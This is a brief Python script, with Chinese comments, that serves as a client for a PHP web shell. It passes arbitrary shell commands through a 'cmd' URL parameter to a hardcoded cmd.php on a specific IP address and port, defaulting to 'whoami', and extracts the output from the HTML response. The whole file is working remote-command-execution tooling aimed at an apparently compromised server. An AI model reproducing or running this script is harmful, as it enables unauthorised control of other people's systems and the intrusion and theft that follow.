#!/usr/bin/env python3
# Webshell命令执行工具

import urllib.request
import urllib.parse
import sys
import re

def exec_cmd(url, cmd):
    """执行命令并解析响应"""
    try:
        params = urllib.parse.urlencode({'cmd': cmd})
        full_url = f"{url}?{params}"
        
        req = urllib.request.Request(full_url)
        req.add_header('User-Agent', 'Mozilla/5.0')
        
        with urllib.request.urlopen(req, timeout=10) as response:
            html = response.read().decode('utf-8', errors='ignore')
            
            # 尝试提取<pre>标签内容
            pre_match = re.search(r'<pre>(.*?)</pre>', html, re.DOTALL)
            if pre_match:
                return pre_match.group(1).strip()
            
            # 如果没有pre标签，返回整个响应（排除HTML标签）
            text = re.sub(r'<[^>]+>', '', html)
            text = re.sub(r'\s+', ' ', text)
            
            # 查找可能的错误信息
            if 'ERROR' in html or 'error' in html.lower():
                return "ERROR"
            
            return text[:500] if text else "无响应"
            
    except Exception as e:
        return f"错误: {str(e)}"

if __name__ == "__main__":
    url = "http://203.155.188.41:8082/dashboard/javascripts/cmd.php"
    
    if len(sys.argv) > 1:
        cmd = " ".join(sys.argv[1:])
    else:
        cmd = "whoami"
    
    result = exec_cmd(url, cmd)
    print(result)
